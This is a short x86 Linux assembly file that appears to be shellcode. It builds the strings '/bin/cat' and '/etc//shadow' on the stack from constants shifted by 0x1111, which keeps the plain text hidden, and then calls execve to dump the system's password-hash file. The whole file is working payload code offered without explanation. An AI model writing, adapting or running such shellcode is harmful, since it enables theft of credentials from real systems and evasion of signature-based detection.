global _start

section .text

_start:

        xor    eax, eax
	push   eax

        mov     dx, 0x1111
        
	mov    ebx, 0x74617440      ;tac/
        sub     ebx, edx
        push    ebx
        
	mov    ebx, 0x6e697340      ;nib/
        sub     ebx, edx
        push    ebx
        
	mov    ebx,esp
        push    eax
        
        loop1:
	mov    ecx, 0x776f7572      ;woda
        sub    ecx, edx
        push   ecx
	mov    ecx, 0x68734040      ;hs//
        sub    ecx, edx
        push   ecx
  	mov    ecx, 0x63747640      ;cte/
        sub    ecx, edx
        push    ecx
	mov    ecx,esp

        xor     edx,edx
	push   eax

	push   ecx
	push   ebx

	mov    ecx,esp         ; ptr to argument array

	mov    al,0xb          ;execve()

	int    0x80            ; kernel interrupt